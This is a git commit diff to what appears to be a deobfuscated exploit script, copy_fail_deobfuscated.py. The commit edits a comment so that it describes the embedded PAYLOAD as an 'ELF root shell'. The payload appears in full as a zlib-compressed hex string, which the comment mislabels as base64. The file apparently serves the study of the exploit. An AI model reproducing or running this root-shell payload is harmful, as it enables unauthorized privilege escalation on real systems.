13952c2ae58b84e2cb386d2c05841b362381ad13
gio <gianpaolo.girasoli@uconn.edu>
2026-05-14 13:34:26 -0400

    added payload clarification

--- copyFail/copy_fail_deobfuscated.py
+++ copyFail/copy_fail_deobfuscated.py
@@ -3,7 +3,7 @@ import os
 import zlib
 import socket
 
-#B64-encoded byte payload
+#B64-encoded byte payload, ELF root shell
 PAYLOAD = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
 
 ''' Function d() --> toBytes() '''
